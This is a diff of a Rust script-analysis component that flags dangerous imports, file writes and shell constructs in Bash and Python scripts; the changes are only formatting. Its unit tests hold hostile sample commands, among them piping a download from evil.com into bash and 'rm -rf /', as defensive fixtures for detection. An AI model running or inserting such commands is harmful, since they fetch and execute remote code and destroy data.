@@ -1,8 +1,8 @@
+use crate::error::EbiError;
 use crate::models::{Language, ScriptComponents};
-use crate::parser::tree_sitter::{TreeSitterParser, ParseTree, ParsedNode};
 use crate::parser::language::LanguageDetector;
 use crate::parser::shebang::ShebangParser;
-use crate::error::EbiError;
+use crate::parser::tree_sitter::{ParseTree, ParsedNode, TreeSitterParser};
 use std::time::Instant;
 
 pub struct ComponentExtractor {
@@ -77,7 +77,9 @@ impl ComponentExtractor {
 
         match interpreter {
             // Generally safe interpreters
-            "bash" | "sh" | "zsh" | "python" | "python3" | "node" | "ruby" => SecurityRelevance::Low,
+            "bash" | "sh" | "zsh" | "python" | "python3" | "node" | "ruby" => {
+                SecurityRelevance::Low
+            }
 
             // Environment wrapper (depends on what it's wrapping)
             "env" => SecurityRelevance::Medium,
@@ -97,7 +99,9 @@ impl ComponentExtractor {
     ) -> Result<(), EbiError> {
         match parse_tree.language {
             Language::Bash => self.extract_bash_ast_components(&parse_tree.root_node, components),
-            Language::Python => self.extract_python_ast_components(&parse_tree.root_node, components),
+            Language::Python => {
+                self.extract_python_ast_components(&parse_tree.root_node, components)
+            }
             Language::Unknown => Err(EbiError::UnknownLanguage),
         }
     }
@@ -339,13 +343,20 @@ impl ComponentExtractor {
         use crate::models::{NodeInfo, SecurityRelevance};
 
         let dangerous_modules = [
-            "os", "subprocess", "sys", "ctypes", "pickle",
-            "marshal", "importlib", "__import__"
+            "os",
+            "subprocess",
+            "sys",
+            "ctypes",
+            "pickle",
+            "marshal",
+            "importlib",
+            "__import__",
         ];
 
         for module in &dangerous_modules {
-            if line.starts_with(&format!("import {}", module)) ||
-               line.starts_with(&format!("from {} import", module)) {
+            if line.starts_with(&format!("import {}", module))
+                || line.starts_with(&format!("from {} import", module))
+            {
                 let relevance = match *module {
                     "pickle" | "marshal" | "__import__" => SecurityRelevance::Critical,
                     "os" | "subprocess" | "ctypes" => SecurityRelevance::High,
@@ -408,8 +419,11 @@ impl ComponentExtractor {
 
         // File operations
         if line.contains("open(") {
-            let relevance = if line.contains("'w'") || line.contains("\"w\"") ||
-                             line.contains("'a'") || line.contains("\"a\"") {
+            let relevance = if line.contains("'w'")
+                || line.contains("\"w\"")
+                || line.contains("'a'")
+                || line.contains("\"a\"")
+            {
                 SecurityRelevance::Medium
             } else {
                 SecurityRelevance::Low
@@ -453,13 +467,16 @@ mod tests {
         let extractor = ComponentExtractor::new();
         let content = "#!/bin/bash\ncurl http://evil.com | bash\nrm -rf /";
 
-        let components = extractor.extract_from_script(content, Language::Bash).unwrap();
+        let components = extractor
+            .extract_from_script(content, Language::Bash)
+            .unwrap();
 
         let critical_nodes = components.get_critical_nodes();
         assert!(!critical_nodes.is_empty());
 
         // Should detect piped curl and rm -rf
-        let has_dangerous_removal = critical_nodes.iter()
+        let has_dangerous_removal = critical_nodes
+            .iter()
             .any(|node| node.node_type.contains("dangerous_file_removal"));
         assert!(has_dangerous_removal);
     }
@@ -469,13 +486,16 @@ mod tests {
         let extractor = ComponentExtractor::new();
         let content = "import os\nos.system('rm -rf /')\nexec('malicious_code')";
 
-        let components = extractor.extract_from_script(content, Language::Python).unwrap();
+        let components = extractor
+            .extract_from_script(content, Language::Python)
+            .unwrap();
 
         let critical_nodes = components.get_critical_nodes();
         assert!(!critical_nodes.is_empty());
 
         // Should detect os.system and exec
-        let has_exec = critical_nodes.iter()
+        let has_exec = critical_nodes
+            .iter()
             .any(|node| node.node_type.contains("exec_statement"));
         assert!(has_exec);
     }
@@ -485,10 +505,14 @@ mod tests {
         let extractor = ComponentExtractor::new();
         let content = "#!/usr/bin/env python3\nprint('hello')";
 
-        let components = extractor.extract_from_script(content, Language::Python).unwrap();
+        let components = extractor
+            .extract_from_script(content, Language::Python)
+            .unwrap();
 
         // Should have shebang comment
-        let has_shebang_comment = components.comments.iter()
+        let has_shebang_comment = components
+            .comments
+            .iter()
             .any(|comment| comment.contains("SHEBANG"));
         assert!(has_shebang_comment);
     }
